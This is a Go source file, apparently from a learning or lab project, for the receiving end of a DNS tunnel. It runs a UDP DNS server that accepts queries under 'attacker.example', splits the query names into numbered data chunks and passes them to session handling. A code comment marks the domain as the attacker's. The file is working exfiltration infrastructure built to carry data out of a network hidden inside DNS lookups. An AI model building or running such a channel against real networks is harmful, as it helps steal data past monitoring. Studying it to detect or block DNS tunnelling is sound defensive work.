package main

import (
	"dns-tunnel/server/server/session"
	"fmt"
	"log"
	"slices"
	"strconv"

	"github.com/miekg/dns"
)

type Chunk struct {
	ID          int
	TotalChunks int
	Position    int
	Data        string
}

func (s *Server) handleA(w dns.ResponseWriter, r *dns.Msg) {
	question := r.Question[0]

	payload := extractPayload(question.Name)

	//logs the dns query
	log.Printf("Received query for: %#v\n", payload)

	//handle payload
	if len(payload) > 0 {
		newChunk, err := parseChunk(payload)
		if err != nil {
			log.Printf("Failed to parse chunk: %v", err)
		} else {
			s.handleChunk(newChunk)
		}
	}

	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true

	//returns an empty answer for now
	w.WriteMsg(m)
}

func parseChunk(payload []string) (Chunk, error) {
	if len(payload) < 4 {
		return Chunk{}, fmt.Errorf(
			"invalid chunk: expected 4 fields, got %d",
			len(payload),
		)
	}

	id, err := strconv.Atoi(payload[0])
	if err != nil {
		return Chunk{}, fmt.Errorf(
			"invalid session ID %q: %w",
			payload[0],
			err,
		)
	}

	total, err := strconv.Atoi(payload[1])
	if err != nil {
		return Chunk{}, fmt.Errorf(
			"invalid total chunks %q: %w",
			payload[1],
			err,
		)
	}

	position, err := strconv.Atoi(payload[2])
	if err != nil {
		return Chunk{}, fmt.Errorf(
			"invalid chunk position %q: %w",
			payload[2],
			err,
		)
	}

	data := payload[3]

	return Chunk{
		ID:          id,
		TotalChunks: total,
		Position:    position,
		Data:        data,
	}, nil
}
func extractPayload(name string) []string {
	domains := dns.SplitDomainName(name)

	if len(domains) < 2 {
		return []string{}
	}

	//Checks if domain belogs to the attacker
	if !slices.Equal(domains[len(domains)-2:], []string{"attacker", "example"}) {
		return []string{}
	}

	payload := domains[:len(domains)-2]

	return payload
}

func main() {

	server := &Server{
		sessions: make(map[int]session.Session),
	}

	dns.HandleFunc(".", server.handleA)
	DNSserver := &dns.Server{Addr: ":8053", Net: "udp"}
	fmt.Println("DNS server running on :8053")
	if err := DNSserver.ListenAndServe(); err != nil {
		log.Fatalf("Server failed: %v", err)
	}
}
